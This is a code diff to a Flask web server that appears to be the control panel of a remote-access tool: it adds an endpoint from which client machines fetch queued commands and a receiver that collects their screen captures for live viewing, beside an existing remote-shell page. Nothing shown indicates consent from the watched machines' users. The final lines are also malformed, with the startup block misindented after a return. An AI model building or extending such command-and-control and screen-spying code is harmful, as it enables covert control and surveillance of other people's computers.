@@ -1,9 +1,10 @@
 import socket
 import requests
+import psutil
 import time
 import platform
 from functools import wraps
-from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
+from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for, Response
 
 app = Flask(__name__)
 
@@ -199,6 +200,15 @@ def login():
     </body>
     </html>
     '''
+commands_queue = {}  # global dict: client_id -> list of commands
+
+@app.route('/getcmd/<client_id>', methods=['GET'])
+def get_command(client_id):
+    if client_id in commands_queue and commands_queue[client_id]:
+        cmd = commands_queue[client_id].pop(0)  # get first queued command
+        return cmd
+    return ""
+
 
 @app.route('/home')
 @login_required
@@ -653,3 +663,59 @@ def remote_shell():
     </body>
     </html>
     '''
+
+latest_frames = {}
+
+@app.route('/live/<client_id>', methods=['POST'])
+def receive_frame(client_id):
+    file = request.files.get('frame')
+    if file:
+        frame_data = file.read()
+        latest_frames[client_id] = frame_data
+        return "OK", 200
+    return "No frame received", 400
+
+def generate_stream(client_id):
+    while True:
+        frame = latest_frames.get(client_id)
+        if frame:
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+        else:
+            # Send empty frame or wait
+            time.sleep(0.1)
+
+@app.route('/live_view/<client_id>')
+def live_view(client_id):
+    return Response(generate_stream(client_id),
+                    mimetype='multipart/x-mixed-replace; boundary=frame')
+
+@app.route('/live')
+def live_clients():
+    # Simple page to select which client to view live stream for
+    clients = list(latest_frames.keys())
+    options = "".join(f'<option value="{c}">{c}</option>' for c in clients)
+    return render_template_string('''
+    <h2>Live Screen View</h2>
+    <select id="client-select">
+      <option value="">Select Client</option>
+      {{ options|safe }}
+    </select>
+    <div><img id="live-img" style="max-width: 90vw; margin-top: 20px;" /></div>
+
+    <script>
+      const select = document.getElementById('client-select');
+      const img = document.getElementById('live-img');
+      select.addEventListener('change', () => {
+        if(select.value){
+          img.src = '/live_view/' + select.value;
+        } else {
+          img.src = '';
+        }
+      });
+    </script>
+    ''', options=options)
+    
+    if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))
+
